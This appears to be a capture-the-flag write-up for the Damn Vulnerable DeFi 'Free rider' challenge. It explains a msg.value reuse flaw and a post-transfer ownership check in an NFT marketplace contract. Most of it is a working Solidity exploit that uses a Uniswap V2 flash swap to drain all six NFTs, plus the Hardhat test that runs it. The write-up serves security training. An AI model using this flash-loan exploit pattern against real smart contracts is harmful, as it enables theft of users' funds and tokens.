# Challenge #10 - Free rider     
 A new marketplace of Damn Valuable NFTs has been released! There's been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.

 A buyer has shared with you a secret alpha: the marketplace is vulnerable and all tokens can be taken. Yet the buyer doesn't know how to do it. So it's offering a payout of 45 ETH for whoever is willing to take the NFTs out and send them their way.

 You want to build some rep with this buyer, so you've agreed with the plan.

 Sadly you only have 0.5 ETH in balance. If only there was a place where you could get free ETH, at least for an instant.  

## Vulnerability
Looking at the FreeRiderNFTMarketplace.sol contract we can see there's a logical error in the buyOne().
There are 2 problems:    
1. Bad use of msg.value without updating it after the loop, that gives us the ability to get unlimited NFTs 
for the price of 1. (line 72)
2. Logical error on checking the ownerOf the NFT after transfering the token, as 
when the contract transfers the token it changes the ownership instantly from the seller to buyer.  
This is going to allow an attacker to extract funds from the contract. (line 80)

We start with 0.5 ether and in order to exploit the contract we need 15 eth so we need 
to find a way to get that money. That way is done using flash Swaps from uniswap v2. This will 
allow us to get a loan with the amount of money we need to get the NFTs as long as we pay it back. 

## Exploit 
In order to do this we need to craft our own exploitable contract.  

```sol
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IDamnValuableNFT {
	function safeTransferFrom(address, address, uint) external;
}

interface IFreeRiderNFTMarketplace {
	function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IWETH9 {
	function deposit() external payable;
	function withdraw(uint wad) external;
	function transferFrom(address src, address dst, uint wad) external returns (bool);
}

contract FREE_RIDER_EXPLOIT {

	address buyer;
	IUniswapV2Pair pair;
	IWETH9 weth;
	IFreeRiderNFTMarketplace marketplace;
	IUniswapV2Router02 router;
	IDamnValuableNFT nft;

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
		// Convert WETH to ETH
		weth.withdraw(amount0);
		// Init tokenIds
		uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
		// Steal NFTs
		marketplace.buyMany{value: amount0}(tokenIds);
		// Return Uniswap loan
		uint returnAmount = amount0 + 0.1 ether;
		weth.deposit{value: returnAmount}();
		weth.transferFrom(address(this), msg.sender, returnAmount);
		// Transfer NFTs to attacker
        for (uint256 i = 0; i < 6; i++) {
			nft.safeTransferFrom(address(this), address(buyer), i);	
		}
	}

	function exec(
		address _pair,
		address _token0,
		address _token1,
		address _marketplace,
		address _router,
		address _nft,
		address _buyer
	) external {
		buyer = _buyer;
		marketplace = IFreeRiderNFTMarketplace(_marketplace);
		weth = IWETH9(_token1); 
		router = IUniswapV2Router02(_router);
		nft = IDamnValuableNFT(_nft);
		pair = IUniswapV2Pair(_pair);
		// Get Flash loan for 15 WETH
		pair.swap(
			15 ether,
			0,
			address(this),
			bytes('not empty')
		);	
	}

    // Interface required to receive NFT as a Smart Contract
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
```  
Finnally, we just need to execute it and and see our balance grow.   

```js
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
		//Deploy Exploit 
		this.exploit = await (await ethers.getContractFactory('FREE_RIDER_EXPLOIT', attacker)).deploy();
		await this.exploit.exec(
			this.uniswapPair.address,
			this.token.address,
			this.weth.address, 
			this.marketplace.address,
			this.uniswapRouter.address,
			this.nft.address,
			this.buyerContract.address
		);
    });

```

